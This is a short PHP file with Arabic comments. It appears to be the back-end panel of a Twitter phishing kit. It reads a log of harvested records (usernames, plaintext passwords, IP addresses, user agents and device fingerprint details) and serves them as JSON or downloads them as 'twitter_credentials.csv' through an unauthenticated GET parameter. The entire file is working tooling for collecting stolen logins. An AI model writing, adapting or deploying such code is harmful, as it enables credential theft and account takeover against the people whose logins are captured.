<?php
// معالجة البيانات واستخراجها
class CredentialProcessor {
    private $log_file = 'logs/credentials.txt';
    
    public function getAllCredentials() {
        if (!file_exists($this->log_file)) {
            return [];
        }
        
        $lines = file($this->log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $credentials = [];
        
        foreach ($lines as $line) {
            $data = json_decode($line, true);
            if ($data) {
                $credentials[] = $data;
            }
        }
        
        return array_reverse($credentials); // أحدث البيانات أولاً
    }
    
    public function exportToCSV() {
        $credentials = $this->getAllCredentials();
        $csv_data = "Timestamp,Username,Password,IP Address,User Agent,Language,Platform,Screen Resolution,Timezone\n";
        
        foreach ($credentials as $cred) {
            $csv_data .= '"' . implode('","', [
                $cred['timestamp'],
                $cred['username'],
                $cred['password'],
                $cred['ip_address'],
                $cred['user_agent'],
                $cred['language'],
                $cred['platform'],
                $cred['screen_resolution'],
                $cred['timezone']
            ]) . "\"\n";
        }
        
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="twitter_credentials.csv"');
        echo $csv_data;
        exit();
    }
}

// واجهة المعالجة
if (isset($_GET['action'])) {
    $processor = new CredentialProcessor();
    
    switch ($_GET['action']) {
        case 'view':
            $creds = $processor->getAllCredentials();
            echo json_encode($creds, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
            break;
        case 'export':
            $processor->exportToCSV();
            break;
    }
}
?>